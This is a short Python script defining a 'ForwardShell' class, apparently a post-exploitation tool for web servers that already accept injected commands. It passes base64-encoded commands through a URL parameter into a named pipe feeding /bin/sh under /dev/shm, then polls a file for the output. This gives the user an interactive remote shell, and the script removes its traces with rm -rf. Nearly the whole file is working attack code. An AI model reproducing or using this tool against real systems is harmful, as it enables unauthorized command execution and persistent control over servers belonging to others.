#!/usr/bin/env python3

import requests

from base64 import b64encode
from random import randint
from termcolor import colored
import time

class ForwardShell:

    def __init__(self, url, arg):
        session = randint(1000,9999)
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.main_url = url
        self.arg = arg

    def set_data(self, command):
        data = {
            self.arg: command  
        }

        return data

    def run_command(self, command):

        command = f"{command}\n"
        command = b64encode(command.encode()).decode()

        command = f'echo "%s" | base64 -d > %s' % (command, self.stdin)

        data = self.set_data(command)

        r = requests.get(self.main_url, params=data)

    def remove_files(self):

        command = f"rm -rf %s %s" % (self.stdin, self.stdout)
        data = self.set_data(command)
        requests.get(self.main_url, params=data)


    def clear_output(self):
        command = f"echo '' > %s" % self.stdout
        
        data = self.set_data(command)
        
        requests.get(self.main_url, params=data)

    def read_output(self):
        command = f'cat "%s"' % self.stdout
        
        data = self.set_data(command)
        
        for _ in range(5):
            r = requests.get(self.main_url, params=data)
            time.sleep(0.2)

        self.clear_output()
        return r.text


    def set_setup(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)

        data = self.set_data(command)

        try:
            requests.get(self.main_url, params=data, timeout=5)
        except:
            pass

    def start(self):
        int_type = ">"
        self.set_setup()

        while True:
            command = input(colored(int_type + " ", "yellow")) 
            output = self.run_command(command)
            output = self.read_output()
            print(output)
